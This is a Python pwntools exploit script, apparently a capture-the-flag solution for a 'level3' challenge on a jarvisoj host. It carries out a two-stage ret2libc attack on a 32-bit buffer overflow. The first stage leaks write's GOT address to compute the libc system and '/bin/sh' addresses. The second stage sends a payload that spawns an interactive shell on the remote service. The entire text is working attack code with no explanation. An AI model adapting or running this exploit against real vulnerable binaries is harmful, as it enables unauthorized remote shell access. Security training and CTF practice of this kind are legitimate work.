#!/usr/bin/python

from pwn import *

def leak_addr():
    '''
    leak system addr and binsh addr
    '''
    global io
    global elf
    global libc

    payload  = 'A' * (0x88+0x4) 
    payload += p32(elf.plt['write']) # plt of write
    payload += p32(0x08048484)       # main function -> the ret addr of write
    payload += p32(1)                # fd
    payload += p32(elf.got['write']) # 
    payload += p32(4)                # len
    
    io.recvuntil('Input:\n')
    io.sendline(payload)
    write_addr = u32(io.recv(4))
    
    libc_offset  = write_addr  - libc.symbols['write']
    system_addr  = libc_offset + libc.symbols['system'] 
    binsh_addr   = libc_offset + libc.search('/bin/sh').next()
    
    return (system_addr, binsh_addr)
    

def exploit():
    global io
    system_addr, binsh_addr = leak_addr()
    
    print(hex(system_addr))
    print(hex(binsh_addr))
    payload   = 'A' * (0x88 + 0x4)
    payload  += p32(system_addr) # ret addr
    payload  += 'A' * 0x4        #  
    payload  += p32(binsh_addr)  # binsh
    
    io.sendline(payload)
    
    # get shell
    io.interactive()


if __name__ == '__main__':
    target_elf = './level3'
    target_libc = './libc-2.19.so'

    target_host = 'pwn2.jarvisoj.com'
    target_port = '9879'

    #context.log_level = 'debug'
    #context.terminal = ['tmux', 'splitw', '-v']

    #gdb.attach(proc.pidof(p)[0])

    elf = ELF(target_elf)
    libc = ELF(target_libc)

    LOCAL = True
    LOCAL = False

    if LOCAL:
        io = process(target_elf, env={'LD_PRELOAD':target_libc})
        #io = process(target_elf)
        gdb.attach(io, 
        '''b *0x0804844B
        #b *0x0000000000400DC8''')
    else:
        io = remote(target_host, target_port)
    
    exploit()


